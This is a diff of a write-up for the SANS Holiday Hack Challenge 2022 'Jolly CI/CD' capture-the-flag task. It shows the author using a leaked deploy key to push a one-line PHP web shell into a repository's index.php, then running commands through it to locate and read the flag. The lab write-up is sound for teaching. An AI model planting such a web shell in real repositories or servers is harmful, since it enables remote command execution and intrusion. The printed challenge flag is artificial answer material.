@@ -1,6 +1,6 @@
 # SANS Holiday Hack Challenge 2022 - KringleCon V: Golden Rings
 ## Recover the Elfen Ring
-### Prison Escape
+### Jolly CI/CD
 Difficulty: :christmas_tree::christmas_tree::christmas_tree::christmas_tree::christmas_tree:  
 Exploit a CI/CD pipeline. Get hints for this challenge from Tinsel Upatree in the Elfen Ring.
 
@@ -66,8 +66,7 @@ Date:   Mon Oct 24 17:32:07 2022 -0700
 ```
 Assuming `whoops` either introduces or fixes the issue, I `diff`-ed it with previous and subsequent commits, identifying a private ssh key was removed:
 ```bash
-grinchum-land:~/wordpress.flag.net.internal$ git diff
-abdea0ebb21b156c01f7533cea3b895c26198c98 e19f653bde9ea3de6af21a587e41e7a909db1ca5 | cat
+grinchum-land:~/wordpress.flag.net.internal$ git diff abdea0ebb21b156c01f7533cea3b895c26198c98 e19f653bde9ea3de6af21a587e41e7a909db1ca5 | cat
 diff --git a/.ssh/.deploy b/.ssh/.deploy
 deleted file mode 100644
 index 3f7a9e3..0000000
@@ -140,21 +139,138 @@ I wrote a short PHP code that would execute commands received over the `cmd` GET
 Then I substituted the original `index.php` with a one-liner version of that php script, committed and verified it was working:
 ```bash
 grinchum-land:~/wordpress.flag.net.internal$ echo '<?php $output=null; $retval=null; exec ($_GET["cmd"], $output, $retval); echo "OUTPUT --> "; print_r($output); echo "\nRETVAL --> $retval"; ?>' > index.php
+grinchum-land:~/wordpress.flag.net.internal$ git config --global user.email "you@example.com"
+grinchum-land:~/wordpress.flag.net.internal$ git config --global user.name "Your Name"
 grinchum-land:~/wordpress.flag.net.internal$ git add --all && git commit -m "$(date)" && git push
-# Output removed to shorten report
+[main 7507011] Sun Jan 15 14:13:42 GMT 2023
+ 1 file changed, 1 insertion(+), 17 deletions(-)
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Delta compression using up to 2 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 373 bytes | 373.00 KiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
 To gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git
-37b5d57..3b5efbd main -> main
+   37b5d57..7507011  main -> main
 grinchum-land:~/wordpress.flag.net.internal$ wget "wordpress.flag.net.internal?cmd=whoami" -q -O -
 OUTPUT --> Array
 (
 	[0] => www-data
 )
 ```
+I then just literally searched for `flag` maybe because the word repeated quite a lot, found and read it:
+```bash
+grinchum-land:~/wordpress.flag.net.internal$ wget "wordpress.flag.net.internal?cmd=find /* 2>/dev/null | grep flag" -q -O -
+OUTPUT --> Array
+(
+    [0] => /flag.txt
+    [1] => /proc/sys/kernel/acpi_video_flags
+    [2] => /proc/kpageflags
+    [3] => /sys/devices/platform/serial8250/tty/ttyS0/flags
+    [4] => /sys/devices/virtual/net/eth0/flags
+    [5] => /sys/devices/virtual/net/lo/flags
+    [6] => /sys/module/scsi_mod/parameters/default_dev_flags
+    [7] => /usr/src/wordpress/wp-includes/images/icon-pointer-flag.png
+    [8] => /usr/src/wordpress/wp-includes/images/icon-pointer-flag-2x.png
+    [9] => /usr/include/x86_64-linux-gnu/asm/processor-flags.h
+    [10] => /usr/include/x86_64-linux-gnu/bits/termios-c_iflag.h
+    [11] => /usr/include/x86_64-linux-gnu/bits/waitflags.h
+    [12] => /usr/include/x86_64-linux-gnu/bits/mman-map-flags-generic.h
+    [13] => /usr/include/x86_64-linux-gnu/bits/termios-c_oflag.h
+    [14] => /usr/include/x86_64-linux-gnu/bits/ss_flags.h
+    [15] => /usr/include/x86_64-linux-gnu/bits/termios-c_lflag.h
+    [16] => /usr/include/x86_64-linux-gnu/bits/termios-c_cflag.h
+    [17] => /usr/include/linux/tty_flags.h
+    [18] => /usr/include/linux/kernel-page-flags.h
+    [19] => /usr/bin/dpkg-buildflags
+    [20] => /usr/lib/x86_64-linux-gnu/perl/5.32.1/bits/waitflags.ph
+    [21] => /usr/lib/x86_64-linux-gnu/perl/5.32.1/bits/ss_flags.ph
+    [22] => /usr/share/dpkg/buildflags.mk
+    [23] => /usr/local/lib/php/build/ax_check_compile_flag.m4
+    [24] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-1024x684.png
+    [25] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-2048x1367.png
+    [26] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-300x200.png
+    [27] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-600x401.png
+    [28] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-300x300.png
+    [29] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-220x154.png
+    [30] => /var/www/html/wp-content/uploads/2022/10/bowes_flag.png
+    [31] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-100x100.png
+    [32] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-768x513.png
+    [33] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-150x150.png
+    [34] => /var/www/html/wp-content/uploads/2022/10/bowes_flag-1536x1025.png
+    [35] => /var/www/html/wp-content/plugins/woocommerce/packages/woocommerce-blocks/assets/js/settings/blocks/feature-flags.ts
+    [36] => /var/www/html/wp-includes/images/icon-pointer-flag.png
+    [37] => /var/www/html/wp-includes/images/icon-pointer-flag-2x.png
+)
+
+RETVAL --> 0
+```
+```bash
+grinchum-land:~/wordpress.flag.net.internal$ wget "wordpress.flag.net.internal?cmd=cat /flag.txt" -q -O -
+OUTPUT --> Array
+(
+    [0] => 
+    [1] =>                         Congratulations! You've found the HHC2022 Elfen Ring!
+    [2] => 
+    [3] => 
+    [4] =>                                         ░░░░            ░░░░
+    [5] =>                                 ░░                              ░░░░
+    [6] =>                             ░░                                      ░░░░
+    [7] =>                                                                         ░░
+    [8] =>                       ░░                                                  ░░░░
+    [9] =>                                                                               ░░
+    [10] =>                                       ░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░                  ░░
+    [11] =>                                   ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░                ░░
+    [12] =>                               ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒                ░░
+    [13] =>                           ░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓░░              ▓▓▓▓▓▓▓▓▒▒░░░░            ░░░░
+    [14] =>           ░░            ░░▒▒▓▓▓▓▓▓▓▓                            ▓▓▓▓▓▓▒▒░░            ░░░░
+    [15] =>                       ░░▒▒▓▓▓▓▓▓                                    ▓▓▒▒▒▒░░          ░░░░
+    [16] =>                       ▒▒▓▓▓▓▓▓                                        ▓▓▓▓▒▒░░          ░░░░
+    [17] =>       ░░            ▒▒▓▓▓▓▓▓                                            ▓▓▒▒░░░░        ░░░░▒▒
+    [18] =>                   ░░▒▒▓▓▓▓░░                                            ░░▒▒▒▒░░░░      ░░░░▒▒
+    [19] =>                   ░░▓▓▓▓▓▓                                                ▓▓▒▒░░░░      ░░░░▒▒
+    [20] =>     ░░            ▒▒▓▓▓▓                                                    ▒▒░░░░        ░░▒▒▒▒
+    [21] =>     ░░          ░░▓▓▓▓▓▓                                                    ▒▒▒▒░░░░      ░░▒▒▒▒
+    [22] =>     ░░          ▒▒▓▓▓▓                                                        ▒▒░░░░      ░░▒▒▒▒
+    [23] =>                 ▒▒▓▓▓▓                                                        ▒▒░░░░░░    ░░▒▒▒▒
+    [24] =>   ░░          ░░▓▓▓▓▒▒                                                        ▒▒░░░░░░    ░░▒▒▒▒▓▓
+    [25] =>   ░░          ▒▒▓▓▓▓                                                            ░░░░░░░░  ░░▒▒▒▒▓▓
+    [26] =>   ░░          ▒▒▓▓▓▓                                                            ░░░░░░░░  ░░▒▒▒▒▓▓
+    [27] =>   ░░          ▒▒▓▓▓▓               oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT             ░░░░░░░░  ░░▒▒▒▒▓▓
+    [28] =>   ░░░░        ▒▒▓▓▓▓                                                            ░░░░  ░░░░░░▒▒▒▒▓▓
+    [29] =>   ░░░░        ▒▒▓▓▓▓                                                            ░░    ░░░░▒▒▒▒▒▒▓▓
+    [30] =>   ▒▒░░        ▒▒▓▓▓▓                                                            ░░    ░░░░▒▒▒▒▒▒▓▓
+    [31] =>   ▒▒░░░░      ▒▒▓▓▓▓                                                            ░░    ░░░░▒▒▒▒▒▒▓▓
+    [32] =>   ▓▓░░░░      ░░▓▓▓▓▒▒                                                        ░░      ░░░░▒▒▒▒▓▓▓▓
+    [33] =>     ▒▒░░        ▒▒▓▓▓▓                                                        ░░    ░░░░▒▒▒▒▒▒▓▓
+    [34] =>     ▒▒░░░░      ░░▓▓▓▓                                                        ░░    ░░░░▒▒▒▒▓▓▓▓
+    [35] =>     ▓▓▒▒░░      ░░▒▒▓▓▓▓                                                    ░░      ░░▒▒▒▒▒▒▓▓▓▓
+    [36] =>     ▓▓▒▒░░░░      ▒▒▒▒▓▓                                                          ░░░░▒▒▒▒▒▒▓▓▓▓
+    [37] =>       ▒▒▒▒░░░░    ▒▒▒▒▒▒▒▒                                                        ░░▒▒▒▒▒▒▒▒▓▓
+    [38] =>       ▓▓▒▒░░░░    ░░░░▒▒▒▒▓▓                                            ░░      ░░░░▒▒▒▒▒▒▓▓▓▓
+    [39] =>         ▒▒▒▒░░░░    ░░▒▒▒▒▒▒▒▒                                        ░░      ░░░░▒▒▒▒▒▒▒▒▓▓
+    [40] =>           ▓▓▒▒░░░░  ░░░░░░░░▒▒▓▓                                    ░░      ░░░░▒▒▒▒▒▒▓▓▓▓
+    [41] =>           ▓▓▓▓▒▒░░░░░░░░░░░░░░▒▒▒▒▓▓                            ░░        ░░░░▒▒▒▒▒▒▓▓▓▓▓▓
+    [42] =>             ▓▓▓▓▒▒░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒                ░░░░          ░░░░▒▒▒▒▒▒▓▓▓▓▓▓
+    [43] =>               ▓▓▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                ░░░░▒▒▒▒▒▒▓▓▓▓▓▓
+    [44] =>                 ▓▓▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░                        ░░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓
+    [45] =>                   ▓▓▓▓▓▓▒▒▒▒░░░░░░░░░░░░░░░░              ░░░░░░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓
+    [46] =>                     ▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓
+    [47] =>                       ██▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓██
+    [48] =>                           ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██
+    [49] =>                             ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████
+    [50] =>                                 ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████
+    [51] =>                                 ░░░░░░░░▓▓██████████████████░░░░░░░░
+)
+
+RETVAL --> 0
+```
+The solution is the string `oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT` in the above output.
+
 ---
 ## Recover the Elfen Ring
 ### Clone with a Difference
 ### Prison Escape
-### Jolly CI/CD
 ### The Elfen Ring
 ## Recover the Web Ring
 ### Naughty IP
